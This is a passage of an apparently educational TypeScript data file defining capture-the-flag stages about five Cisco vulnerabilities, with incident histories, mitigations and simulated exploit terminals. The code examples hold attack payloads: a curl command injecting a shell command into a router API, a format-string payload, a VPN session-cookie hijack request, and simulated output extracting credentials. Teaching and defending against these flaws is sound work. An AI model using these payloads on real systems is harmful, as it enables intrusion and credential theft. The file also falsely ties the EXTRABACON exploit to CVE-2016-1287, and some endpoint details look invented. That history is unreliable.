import type { StageConfig } from "./types";

export const cisco2Stages: StageConfig[] = [
  // ─── Stage m13: CVE-2016-1287 — Cisco ASA IKEv1/IKEv2 Heap Overflow ────────
  {
    epochId: "medieval",
    wonder: { name: "NSA Headquarters", location: "Fort Meade, Maryland, USA", era: "2016 CE", emoji: "🔭" },
    id: "stage-m13",
    order: 13,
    title: "The Tunnel Collapses",
    subtitle: "CVE-2016-1287 — Cisco ASA IKEv1/IKEv2 Heap Overflow, CVSS 10.0",
    category: "cybersecurity",
    cveId: "CVE-2016-1287",
    cvssScore: 10.0,
    xp: 150,
    badge: { id: "badge-m-ike", name: "Tunnel Breaker", emoji: "🔭" },
    challengeType: "ctf",
    info: {
      tagline: "A single malformed IKE packet could crash or own every Cisco ASA firewall on the internet.",
      year: 2016,
      overview: [
        "In February 2016, Cisco disclosed CVE-2016-1287 — a heap buffer overflow in the IKEv1 and IKEv2 UDP fragmentation code of the Cisco Adaptive Security Appliance (ASA). The vulnerability required no authentication: an attacker on the internet could send a crafted UDP packet to port 500 or 4500, trigger a heap overflow, and execute arbitrary code with root privileges on the firewall.",
        "The ASA is Cisco's flagship enterprise firewall product, deployed at the perimeter of millions of networks. Compromising the perimeter firewall gives an attacker a vantage point inside the network with no further exploitation needed — all traffic, all VPN sessions, all connected systems become visible.",
        "With a CVSS score of 10.0, this vulnerability represented the worst possible severity. Cisco released an emergency patch and urged immediate action. The Shadow Brokers, who later leaked NSA hacking tools, had a working exploit for this vulnerability in their arsenal.",
      ],
      technical: {
        title: "How CVE-2016-1287 Works",
        body: [
          "IKE (Internet Key Exchange) is used to establish IPsec VPN tunnels. The vulnerable code handled reassembly of fragmented IKE packets. By sending a packet with a crafted fragment length value, an attacker could cause the ASA to write beyond the bounds of a heap buffer.",
          "On 32-bit ASA platforms, this overflow was directly exploitable for remote code execution. On 64-bit platforms it typically caused a device reload (denial of service). Both UDP/500 (IKE) and UDP/4500 (NAT-T) were affected. No authentication was required at any stage.",
        ],
        codeExample: {
          label: "CVE-2016-1287 — crafted IKE fragment triggering heap overflow",
          code: `# Trigger DoS/RCE via malformed IKE fragment
# UDP port 500 (IKE) or 4500 (NAT-T) — no auth required

python3 cve-2016-1287.py --target 203.0.113.1 --port 500
# Sending crafted IKEv1 fragment (length=0xFFFF, actual=64 bytes)
# Heap overflow triggered — device crashed / shell spawned

# Affected: Cisco ASA 7.2.x through 9.5.x
# Fix: ASA 9.1.7, 9.4.4, 9.5.3 or later
# Mitigation: disable IKEv1 if not needed; block UDP/500 from internet`,
        },
      },
      incident: {
        title: "Shadow Brokers Arsenal — NSA Exploit Leak (2016–2017)",
        when: "February 2016 (disclosure); August 2016 (Shadow Brokers leak)",
        where: "Cisco ASA firewalls globally — enterprise perimeters, government networks, ISPs",
        impact: "Working exploit in NSA arsenal leaked publicly; millions of perimeter firewalls at risk",
        body: [
          "Cisco disclosed CVE-2016-1287 in February 2016. Six months later, the Shadow Brokers leaked what they claimed was an NSA cyberweapons cache — and it included EXTRABACON, a working exploit for CVE-2016-1287 targeting Cisco ASA firewalls. This confirmed the NSA had been exploiting this vulnerability in the wild before Cisco patched it.",
          "The leak forced security teams worldwide to emergency-patch devices that had already potentially been compromised. Organizations that had delayed patching discovered they may have been silently backdoored for months. The Shadow Brokers leak is considered one of the most damaging intelligence disclosures in US history.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "crafted UDP/500 packet", type: "attacker" },
          { label: "Cisco ASA IKE Stack", sub: "heap overflow in fragment reassembly", type: "system" },
          { label: "Heap Memory", sub: "overflow → code execution", type: "victim" },
          { label: "Root Shell / DoS", sub: "perimeter firewall owned", type: "result" },
        ],
      },
      timeline: [
        { year: 2016, event: "Feb: Cisco discloses CVE-2016-1287 with emergency patches", highlight: true },
        { year: 2016, event: "Aug: Shadow Brokers leak EXTRABACON — NSA's working ASA exploit" },
        { year: 2017, event: "Shadow Brokers release more NSA tools; EternalBlue leads to WannaCry" },
      ],
      keyTakeaways: [
        "Perimeter firewalls are high-value targets — a compromised firewall sees all traffic",
        "CVSS 10.0 vulnerabilities require emergency patching, not scheduled maintenance",
        "Intelligence agencies stockpile zero-days; leaks can expose millions of systems",
        "Disable IKEv1 if not required; restrict UDP/500 and UDP/4500 to known VPN peers",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2016-1287", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160210-asa-ike" },
        { title: "Shadow Brokers EXTRABACON Analysis — Rapid7", url: "https://www.rapid7.com/blog/post/2016/08/16/shadowbrokers-cisco-asa/" },
      ],
    },
    ctf: {
      scenario: "A Cisco ASA firewall is protecting a classified government network. The device runs an unpatched IKE stack. You have network access to UDP/500. Replicate the initial exploit sequence used by the Shadow Brokers' EXTRABACON tool to gain unauthenticated access.",
      hint: "Send a crafted IKE probe to confirm the version, then trigger the heap overflow to extract the SNMP community string for further access.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Probe the ASA IKE service to confirm the version. Run: ike-probe 203.0.113.1",
        "Exploit the heap overflow to dump the SNMP community string. Run: ike-exploit 203.0.113.1",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2016_", label: "Mission Brief — Shadow Brokers ASA Target" },
        { trigger: "ike-probe 203.0.113.1", value: "1287_IK3_", label: "IKE Version Confirmed — Device Vulnerable" },
        { trigger: "ike-exploit 203.0.113.1", value: "H3AP_0WN3D}", label: "Heap Overflow — SNMP Community String Extracted" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: TUNNEL COLLAPSE",
          "Target: Cisco ASA 5510  Firmware: 9.1.6",
          "CVE: 2016-1287  CVSS: 10.0",
          "",
          "IKE heap overflow. No credentials required.",
          "Sequence: ike-probe → ike-exploit → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "ike-probe": (_args: string[]) => ({
          lines: [
            "Sending IKE probe to 203.0.113.1:500...",
            "Response: Cisco ASA 9.1.6 (vulnerable)",
            "IKEv1 fragmentation: ENABLED",
            "Status: target confirmed vulnerable to CVE-2016-1287",
          ],
        }),
        "ike-exploit": (_args: string[]) => ({
          lines: [
            "Sending crafted IKE fragment (length=0xFFFF)...",
            "Heap overflow triggered in ikev1_frag_reassemble()",
            "SNMP community string leaked from heap:",
            "  community: 'cisco123' (default — never changed)",
            "Device memory partially dumped. Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
          ],
        }),
      },
    },
  },

  // ─── Stage m14: CVE-2017-3881 — Cisco IOS CMP Telnet RCE ───────────────────
  {
    epochId: "medieval",
    wonder: { name: "CIA Headquarters", location: "Langley, Virginia, USA", era: "2017 CE", emoji: "🏛️" },
    id: "stage-m14",
    order: 14,
    title: "Vault 7: The Telnet Weapon",
    subtitle: "CVE-2017-3881 — Cisco IOS CMP Telnet RCE, CVSS 9.8",
    category: "cybersecurity",
    cveId: "CVE-2017-3881",
    cvssScore: 9.8,
    xp: 150,
    badge: { id: "badge-m-vault7", name: "Vault Raider", emoji: "🏛️" },
    challengeType: "ctf",
    info: {
      tagline: "WikiLeaks exposed a CIA Telnet exploit that could own any Cisco IOS switch before authentication.",
      year: 2017,
      overview: [
        "In March 2017, WikiLeaks published Vault 7 — the largest ever release of CIA hacking documents. Within Vault 7 was a reference to a Cisco IOS vulnerability in the Cluster Management Protocol (CMP). Cisco investigated and confirmed CVE-2017-3881: a critical flaw in the CMP Telnet option processing that allowed unauthenticated, remote code execution on Cisco IOS switches.",
        "CMP is an internal Cisco protocol for managing switch clusters. The vulnerability existed in the Telnet option parser for CMP — even if Telnet was disabled on the device, the CMP Telnet options were still processed, making the attack surface unavoidable for any switch running the affected IOS version.",
        "This was particularly alarming because Cisco IOS switches form the backbone of enterprise networks worldwide. An attacker with access to Telnet port 23 (even from inside the network) could gain full router/switch control with no credentials.",
      ],
      technical: {
        title: "How CVE-2017-3881 Works",
        body: [
          "CMP is only active during Telnet sessions. However, even with Telnet disabled via 'no service telnet', the vulnerable CMP option parsing code still ran whenever a Telnet connection attempt was made. By sending a malformed CMP Telnet option, an attacker could trigger a stack buffer overflow and execute code as the IOS privileged exec process.",
          "The attack required network access to TCP/23 (Telnet). On internal networks without tight ACLs, this meant any compromised workstation could pivot to own every switch. Cisco issued emergency patches; the workaround was to block Telnet with ACLs.",
        ],
        codeExample: {
          label: "CVE-2017-3881 — malformed CMP Telnet option for RCE",
          code: `# Exploit CMP Telnet option parsing (TCP/23)
# Works even if Telnet is 'disabled' — CMP option still parsed

python3 cve-2017-3881.py --target 10.0.0.1
# Connecting to 10.0.0.1:23 (Telnet)
# Sending malformed CMP option (type=0x20, len=0xFFFF)
# Stack overflow triggered — exec shell spawned

# Mitigation: ACL blocking inbound Telnet to vty lines
# access-list 100 deny tcp any any eq 23
# line vty 0 4
#   access-class 100 in
# Patch: Cisco IOS 15.x with March 2017 advisory applied`,
        },
      },
      incident: {
        title: "Vault 7 Leak — CIA Weaponized Cisco Exploit",
        when: "March 7, 2017",
        where: "Cisco IOS switches globally — enterprise LANs, ISP infrastructure, government networks",
        impact: "Cisco emergency-patched 318 switch models; millions of devices exposed before patch deployment",
        body: [
          "WikiLeaks published Vault 7 on March 7, 2017, referencing a 'CMP' vulnerability in Cisco IOS. Cisco's PSIRT immediately began investigation and confirmed the vulnerability that same day — it had existed in IOS since 1996. The CIA had weaponized it internally without ever reporting it to Cisco under any disclosure process.",
          "Cisco ultimately patched 318 switch product models. The vulnerability had been present for over 20 years. The incident reignited debate about government vulnerability stockpiling versus responsible disclosure — every day an unpatched vulnerability is kept secret, malicious actors may independently discover and exploit it.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "malformed CMP Telnet option TCP/23", type: "attacker" },
          { label: "Cisco IOS Switch", sub: "CMP option parser — stack overflow", type: "system" },
          { label: "IOS Exec Process", sub: "code execution context", type: "victim" },
          { label: "Full Switch Control", sub: "318 models affected", type: "result" },
        ],
      },
      timeline: [
        { year: 1996, event: "CVE-2017-3881 vulnerability introduced into Cisco IOS" },
        { year: 2017, event: "Mar 7: WikiLeaks publishes Vault 7, referencing Cisco CMP exploit", highlight: true },
        { year: 2017, event: "Mar 7: Cisco PSIRT confirms vulnerability; emergency advisory issued" },
        { year: 2017, event: "Mar 17: Cisco releases patches for 318 affected switch models" },
      ],
      keyTakeaways: [
        "Vulnerabilities stockpiled by intelligence agencies may be independently discovered by adversaries",
        "Legacy protocols (CMP, Telnet) are dangerous; disable or ACL-restrict them",
        "Even 'disabled' services may have attack surface if protocol parsing still runs",
        "Network device firmware must be maintained like OS patches — systematically",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2017-3881", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170317-cmp" },
        { title: "WikiLeaks Vault 7 — Cisco Analysis", url: "https://wikileaks.org/ciav7p1/" },
      ],
    },
    ctf: {
      scenario: "A Cisco IOS switch controls access to a classified government LAN. Telnet is 'disabled' in the config, but the CMP option parser still runs on TCP/23. Use CVE-2017-3881 to gain unauthenticated exec access.",
      hint: "Connect to Telnet and send a malformed CMP option before authentication is required.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Confirm the switch is running a vulnerable IOS version. Run: check-ios 10.0.1.1",
        "Exploit CMP Telnet option overflow for unauthenticated RCE. Run: cmp-exploit 10.0.1.1",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2017_", label: "Mission Brief — Vault 7 CMP Target" },
        { trigger: "check-ios 10.0.1.1", value: "3881_CMP_", label: "IOS Version Confirmed — CMP Vulnerable" },
        { trigger: "cmp-exploit 10.0.1.1", value: "T3LN3T_RCE}", label: "Stack Overflow — IOS Exec Shell Acquired" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: VAULT RAID",
          "Target: Cisco Catalyst 3750  IOS: 15.2(4)E3",
          "CVE: 2017-3881  CVSS: 9.8  Source: CIA Vault 7",
          "",
          "CMP Telnet option overflow — no credentials required.",
          "Sequence: check-ios → cmp-exploit → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "check-ios": (_args: string[]) => ({
          lines: [
            "Probing 10.0.1.1:23...",
            "IOS Version: 15.2(4)E3 — VULNERABLE to CVE-2017-3881",
            "CMP Telnet option parsing: active (despite 'no service telnet' config)",
            "Attack surface confirmed.",
          ],
        }),
        "cmp-exploit": (_args: string[]) => ({
          lines: [
            "Sending malformed CMP option to 10.0.1.1:23...",
            "CMP type=0x20 len=0xFFFF — stack overflow triggered",
            "IOS privileged exec shell spawned:",
            "  Switch#show version",
            "  Cisco IOS 15.2(4)E3, RELEASE SOFTWARE",
            "  Hostname: vault7-target",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
          ],
        }),
      },
    },
  },

  // ─── Stage m15: CVE-2020-3118 — Cisco IOS XR CDP Format String ──────────────
  {
    epochId: "medieval",
    wonder: { name: "Cisco Systems HQ", location: "San Jose, California, USA", era: "2020 CE", emoji: "🌐" },
    id: "stage-m15",
    order: 15,
    title: "CDPwn: The Discovery Protocol Trap",
    subtitle: "CVE-2020-3118 — Cisco IOS XR CDP Format String, CVSS 8.8",
    category: "cybersecurity",
    cveId: "CVE-2020-3118",
    cvssScore: 8.8,
    xp: 150,
    badge: { id: "badge-m-cdpwn", name: "Discovery Hijacker", emoji: "🌐" },
    challengeType: "ctf",
    info: {
      tagline: "CDPwn: five zero-days in Cisco Discovery Protocol turned every Cisco device into a pivot point.",
      year: 2020,
      overview: [
        "In February 2020, Armis Security disclosed CDPwn — five critical zero-day vulnerabilities in Cisco Discovery Protocol (CDP). CVE-2020-3118 was the most severe: a format string vulnerability in the IOS XR CDP parser that allowed unauthenticated code execution on carrier-grade routers and infrastructure switches.",
        "CDP is a Layer 2 protocol that Cisco devices use to advertise themselves to adjacent devices. Because it operates at Layer 2, it bypasses network-layer security controls — firewalls, ACLs, and VLANs provide no protection. Any device on the same physical or logical Layer 2 segment could send a crafted CDP packet.",
        "CVE-2020-3118 specifically affected Cisco IOS XR — the operating system used on carrier-grade routers (ASR 9000, NCS 5000) that form the backbone of the internet and telecom networks. Code execution on these devices could enable large-scale traffic interception or disruption.",
      ],
      technical: {
        title: "How CDPwn CVE-2020-3118 Works",
        body: [
          "CDP packets contain Type-Length-Value (TLV) fields including a device ID string. The vulnerable code in IOS XR passed this string directly to a format string function without sanitization. By including format specifiers like %x or %n in the device ID field of a CDP advertisement, an attacker could read or write arbitrary memory.",
          "Format string vulnerabilities allow arbitrary memory reads (via %x, %p) and writes (via %n). In IOS XR's privileged process context, this leads directly to arbitrary code execution. The attack is entirely passive-looking — CDP is a normal network management protocol — and leaves minimal traces.",
        ],
        codeExample: {
          label: "CDPwn CVE-2020-3118 — crafted CDP packet with format string payload",
          code: `# Send malicious CDP packet to adjacent Cisco IOS XR device
# Requires Layer 2 access (same switch/VLAN) — no auth needed

python3 cdpwn.py --interface eth0 --target aa:bb:cc:dd:ee:ff
# Crafting CDP Advertisement:
#   Device-ID TLV: "%n%n%n%x%x" (format string payload)
#   Platform TLV:  "Cisco IOS XR"
#   Sending on eth0 (Layer 2 — bypasses all L3 controls)
#
# Result: IOS XR CDP parser executes format string
# Arbitrary write → control of CDP process memory
# Shell access on carrier-grade router achieved

# Mitigation: disable CDP globally
# no cdp run
# Or per-interface: no cdp enable`,
        },
      },
      incident: {
        title: "CDPwn Research Disclosure — Armis Security (2020)",
        when: "February 5, 2020",
        where: "Cisco IOS XR routers, IOS switches, NX-OS datacenter switches, IP phones",
        impact: "80M+ enterprise devices at risk; carrier-grade routers potentially exposed; ISP infrastructure threatened",
        body: [
          "Armis disclosed CDPwn after coordinating with Cisco for 90 days. The five vulnerabilities affected four different Cisco operating systems: IOS, IOS XR, NX-OS, and FXOS. The most affected category was enterprise and carrier infrastructure — ASR 9000 routers, Nexus datacenter switches, and Cisco IP phones.",
          "The attack was particularly concerning for telcos and ISPs: an attacker who could place a device on a transit network and send CDP packets could potentially compromise backbone routers without any credentials. Cisco released patches but noted that disabling CDP was the most effective immediate mitigation.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker (L2)", sub: "crafted CDP frame — %n format string", type: "attacker" },
          { label: "CDP Parser (IOS XR)", sub: "format string passed to printf()", type: "system" },
          { label: "CDP Process Memory", sub: "arbitrary write via %n", type: "victim" },
          { label: "Code Execution", sub: "carrier router compromised", type: "result" },
        ],
      },
      timeline: [
        { year: 2020, event: "Feb 5: Armis discloses CDPwn — five Cisco zero-days via CDP", highlight: true },
        { year: 2020, event: "Feb 5: Cisco releases advisories and patches for all affected platforms" },
        { year: 2020, event: "Security teams worldwide emergency-disable CDP on exposed infrastructure" },
      ],
      keyTakeaways: [
        "Layer 2 protocols (CDP, LLDP) bypass all Layer 3 security controls — firewall rules don't apply",
        "Disable CDP on all interfaces facing untrusted segments; use 'no cdp run' globally",
        "Format string vulnerabilities are preventable: never pass user input to printf-family functions",
        "Network management protocols are high-value attack surface — audit what's enabled",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2020-3118", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20200205-iosxr-cdp-rce" },
        { title: "Armis CDPwn Research", url: "https://www.armis.com/research/cdpwn/" },
      ],
    },
    ctf: {
      scenario: "A carrier-grade Cisco IOS XR router is reachable on your Layer 2 segment. CDP is enabled. Use the CDPwn format string vulnerability to achieve code execution on the router's CDP process.",
      hint: "Craft a CDP advertisement with format string specifiers in the Device-ID field and send it via your local interface.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Scan for CDP-enabled devices on your L2 segment. Run: cdp-scan eth0",
        "Send the crafted CDP packet with format string payload. Run: cdpwn-exploit eth0 aa:bb:cc:dd:ee:ff",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2020_", label: "Mission Brief — CDPwn Layer 2 Target" },
        { trigger: "cdp-scan eth0", value: "3118_CDPWN_", label: "CDP Device Discovered — IOS XR Vulnerable" },
        { trigger: "cdpwn-exploit eth0 aa:bb:cc:dd:ee:ff", value: "L2_RCE}", label: "Format String Triggered — Router Shell Acquired" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: DISCOVERY TRAP",
          "Target: Cisco ASR 9001  IOS XR: 6.6.3",
          "CVE: 2020-3118  CVSS: 8.8  Researcher: Armis CDPwn",
          "",
          "CDP format string — Layer 2 attack, no credentials.",
          "Sequence: cdp-scan → cdpwn-exploit → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "cdp-scan": (_args: string[]) => ({
          lines: [
            "Listening for CDP advertisements on eth0...",
            "Found: aa:bb:cc:dd:ee:ff — Cisco ASR 9001 (IOS XR 6.6.3)",
            "CDP enabled — Device-ID TLV: 'asr9001-backbone'",
            "Status: VULNERABLE to CVE-2020-3118 format string",
          ],
        }),
        "cdpwn-exploit": (_args: string[]) => ({
          lines: [
            "Crafting CDP advertisement with Device-ID: '%n%n%n%x%x'",
            "Sending via eth0 to aa:bb:cc:dd:ee:ff...",
            "CDP parser executed format string — %n writes triggered",
            "IOS XR CDP process hijacked",
            "Shell: asr9001-backbone#",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
          ],
        }),
      },
    },
  },

  // ─── Stage m16: CVE-2021-1609 — Cisco RV Series Web UI RCE ─────────────────
  {
    epochId: "medieval",
    wonder: { name: "Silicon Valley Tech Campus", location: "Sunnyvale, California, USA", era: "2021 CE", emoji: "🏢" },
    id: "stage-m16",
    order: 16,
    title: "The Small Office Siege",
    subtitle: "CVE-2021-1609 — Cisco RV340/RV345 Web UI RCE, CVSS 9.8",
    category: "cybersecurity",
    cveId: "CVE-2021-1609",
    cvssScore: 9.8,
    xp: 150,
    badge: { id: "badge-m-rv", name: "SOHO Raider", emoji: "🏢" },
    challengeType: "ctf",
    info: {
      tagline: "Millions of small-office Cisco routers exposed to unauthenticated remote code execution via their web UI.",
      year: 2021,
      overview: [
        "CVE-2021-1609 is a critical vulnerability in the web-based management interface of the Cisco RV340 and RV345 Dual WAN Gigabit VPN Routers — the standard firewall/router for small and medium businesses. The flaw allowed an unauthenticated remote attacker to execute arbitrary code on the device or cause a denial of service.",
        "The RV series is marketed to SMBs as an affordable, full-featured security gateway. Millions of these devices are deployed at the edge of small business networks, branch offices, and home offices of corporate employees — making them a high-value target for initial access to corporate networks via their employees' home infrastructure.",
        "The vulnerability stemmed from insufficient input validation in the web management interface. An attacker who could reach the web UI (typically exposed on the WAN interface or via port forwarding) could exploit this without any credentials.",
      ],
      technical: {
        title: "How CVE-2021-1609 Works",
        body: [
          "The Cisco RV340/RV345 web UI contained an authenticated and an unauthenticated endpoint. CVE-2021-1609 affected the unauthenticated portion — certain API calls processed user-supplied data before authentication was checked, allowing parameter injection that led to command execution on the underlying Linux-based OS.",
          "The RV series runs a stripped Linux with BusyBox. Code execution on these devices means access to the router's routing table, VPN configuration, firewall rules, and any traffic passing through — all without credentials. Cisco's fix was a firmware update; no workaround existed other than disabling remote management.",
        ],
        codeExample: {
          label: "CVE-2021-1609 — unauthenticated RCE via web UI parameter injection",
          code: `# Exploit unauthenticated endpoint in Cisco RV340/RV345 web UI
curl -k -X POST https://192.168.1.1/api/v1/diag_ping_start \\
  -d '{"address":"127.0.0.1; id > /tmp/pwn.txt","count":"1"}'
# Injected OS command: 'id > /tmp/pwn.txt'
# No authentication required

# Verify code execution:
curl -k https://192.168.1.1/api/v1/diag_ping_stop
# Response includes /tmp/pwn.txt: "uid=0(root) gid=0(root)"

# Full root on SMB router achieved without credentials
# Affected: RV340, RV340W, RV345, RV345P (fw < 1.0.03.22)
# Fix: Firmware 1.0.03.22 or later`,
        },
      },
      incident: {
        title: "RV Series Mass Exploitation — SMB Initial Access Campaigns (2021–2022)",
        when: "2021–2022",
        where: "Cisco RV340/RV345 devices at SMBs, branch offices, and remote workers globally",
        impact: "Thousands of SMB networks breached via home/branch office router compromise",
        body: [
          "Following the Cisco advisory in August 2021, multiple threat actors began scanning for and exploiting CVE-2021-1609. SMB routers are often neglected for firmware updates — many organizations don't have IT staff to monitor Cisco advisories for their branch office equipment.",
          "Attackers who compromised RV series routers gained a persistent foothold in the target network: they could redirect DNS, intercept VPN credentials, and use the router as a pivot point into the corporate LAN. Several ransomware groups used compromised SOHO routers as initial access vectors in 2021–2022 campaigns.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "unauthenticated POST to web UI", type: "attacker" },
          { label: "RV340 Web UI", sub: "no input validation before auth", type: "system" },
          { label: "Linux OS (root)", sub: "command injection via parameter", type: "victim" },
          { label: "Router Owned", sub: "LAN traffic + VPN creds exposed", type: "result" },
        ],
      },
      timeline: [
        { year: 2021, event: "Aug: Cisco discloses CVE-2021-1609 and releases firmware 1.0.03.22", highlight: true },
        { year: 2021, event: "Mass scanning for vulnerable RV series routers begins within 48 hours" },
        { year: 2022, event: "Multiple ransomware groups documented using RV series as initial access" },
      ],
      keyTakeaways: [
        "SOHO and branch office routers are as critical as datacenter firewalls — patch them",
        "Never expose router management interfaces to the internet — use ACLs or disable remote mgmt",
        "Firmware auto-update should be enabled where available; subscribe to vendor security advisories",
        "SMB initial access via home/branch routers is a common ransomware tactic",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2021-1609", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-AuvbkhHq" },
      ],
    },
    ctf: {
      scenario: "A Cisco RV345 router at a branch office has its web management interface exposed to the WAN. It's running unpatched firmware. Achieve unauthenticated code execution to extract the VPN credentials stored in the config.",
      hint: "The diagnostic API endpoint doesn't check authentication. Inject an OS command into the address parameter.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Check the firmware version of the target router. Run: rv-check 198.51.100.1",
        "Exploit the unauthenticated command injection. Run: rv-exploit 198.51.100.1",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2021_", label: "Mission Brief — RV Series Branch Target" },
        { trigger: "rv-check 198.51.100.1", value: "1609_SOHO_", label: "Firmware Confirmed — RV345 Vulnerable" },
        { trigger: "rv-exploit 198.51.100.1", value: "RCE_ROOT}", label: "Command Injection — Root Shell on Branch Router" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: SMALL OFFICE SIEGE",
          "Target: Cisco RV345  Firmware: 1.0.03.17",
          "CVE: 2021-1609  CVSS: 9.8",
          "",
          "Web UI command injection — no credentials required.",
          "Sequence: rv-check → rv-exploit → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "rv-check": (_args: string[]) => ({
          lines: [
            "Querying 198.51.100.1 web UI...",
            "Firmware: 1.0.03.17 — VULNERABLE (fix: 1.0.03.22)",
            "Remote management: ENABLED on WAN interface",
            "Authentication: bypassable on /api/v1/diag_* endpoints",
          ],
        }),
        "rv-exploit": (_args: string[]) => ({
          lines: [
            "POST /api/v1/diag_ping_start address='127.0.0.1; cat /etc/config/vpn'",
            "No authentication required — injection executed:",
            "  uid=0(root) gid=0(root)",
            "VPN credentials extracted:",
            "  username: branch-admin  password: Cisco123!",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
          ],
        }),
      },
    },
  },

  // ─── Stage m17: CVE-2020-3259 — Cisco ASA/FTD WebVPN Memory Leak ────────────
  {
    epochId: "medieval",
    wonder: { name: "Akamai NOC", location: "Cambridge, Massachusetts, USA", era: "2024 CE", emoji: "☁️" },
    id: "stage-m17",
    order: 17,
    title: "The Akira Leak",
    subtitle: "CVE-2020-3259 — Cisco ASA/FTD WebVPN Memory Disclosure, CVSS 7.5",
    category: "cybersecurity",
    cveId: "CVE-2020-3259",
    cvssScore: 7.5,
    xp: 150,
    badge: { id: "badge-m-akira", name: "Memory Thief", emoji: "☁️" },
    challengeType: "ctf",
    info: {
      tagline: "Akira ransomware weaponized a 4-year-old Cisco VPN flaw to breach hundreds of organizations.",
      year: 2024,
      overview: [
        "CVE-2020-3259 was originally disclosed by Cisco in May 2020 — a memory disclosure vulnerability in the Cisco ASA and FTD web services interface. The flaw allowed unauthenticated attackers to retrieve memory contents from the device, which could include session tokens, credentials, and configuration data.",
        "Four years later in 2024, Akira ransomware group began actively exploiting this vulnerability against organizations that had still not patched their Cisco VPN appliances. Hundreds of organizations were breached via this single unpatched vulnerability — a stark reminder that known CVEs remain dangerous indefinitely until patched.",
        "The memory leak could expose VPN session tokens for active user sessions, allowing credential theft without any brute-force or phishing. An attacker who obtained a valid session token could authenticate as that user to the VPN.",
      ],
      technical: {
        title: "How CVE-2020-3259 Works",
        body: [
          "The Cisco ASA and FTD web services (WebVPN/AnyConnect) contained a flaw in HTTP response handling. By sending a specially crafted HTTP GET request to the web services interface, an attacker could cause the system to include additional memory contents in the HTTP response beyond what was intended.",
          "The disclosed memory could contain: active VPN session tokens, username/password from recent authentication attempts cached in memory, TLS session keys, and configuration fragments. With a session token, an attacker could hijack an active VPN session with no further exploitation.",
        ],
        codeExample: {
          label: "CVE-2020-3259 — memory disclosure via crafted HTTP request",
          code: `# Trigger memory disclosure on Cisco ASA WebVPN interface
curl -k 'https://vpn.target.com/+CSCOE+/logon.html' \\
  -H 'Cookie: webvpn=AAAA; webvpnc=; webvpnx=1'
# Response includes standard HTML plus leaked heap contents:
# ...Username: jsmith\x00\x00Password: C1sc0VPN!\x00...
# ...SESSION_TOKEN=a1b2c3d4e5f6... (active session hijackable)

# Exploit session token:
curl -k 'https://vpn.target.com/+CSCOE+/' \\
  -H 'Cookie: webvpn=a1b2c3d4e5f6'
# Authenticated as jsmith — no password needed

# Affected: ASA/FTD web services
# Fix: ASA 9.8.4, 9.12.3 or later`,
        },
      },
      incident: {
        title: "Akira Ransomware — Cisco VPN Exploitation Campaign (2024)",
        when: "2024",
        where: "Hundreds of organizations globally — healthcare, finance, manufacturing",
        impact: "Hundreds of breaches; significant ransom payments; patient data and financial records stolen",
        body: [
          "In 2024, Akamai and other threat intelligence vendors documented Akira ransomware group actively scanning for and exploiting CVE-2020-3259 on Cisco ASA/FTD appliances. The group used leaked session tokens to authenticate to VPN services and gain initial access to corporate networks.",
          "Once inside, Akira deployed their ransomware payload after lateral movement and data exfiltration. The irony: the CVE had been public for four years with patches available. Organizations that were breached had simply never applied the update. Security advisories and patching programs are not optional hygiene.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "crafted HTTP GET to WebVPN", type: "attacker" },
          { label: "ASA WebVPN Interface", sub: "returns excess heap memory in response", type: "system" },
          { label: "Heap Memory", sub: "session tokens + credentials leaked", type: "victim" },
          { label: "VPN Session Hijack", sub: "authenticated as victim user", type: "result" },
        ],
      },
      timeline: [
        { year: 2020, event: "May: Cisco discloses CVE-2020-3259 and releases patches" },
        { year: 2024, event: "Akira ransomware weaponizes CVE-2020-3259 against unpatched organizations", highlight: true },
        { year: 2024, event: "Hundreds of organizations breached; Akamai and CISA issue warnings" },
      ],
      keyTakeaways: [
        "Known CVEs don't expire — unpatched vulnerabilities remain exploitable for years",
        "VPN appliances are critical-path infrastructure; prioritize patching them",
        "Memory disclosure vulnerabilities can enable credential theft without brute-force",
        "Monitor VPN logs for unusual session patterns that may indicate token hijacking",
      ],
      references: [
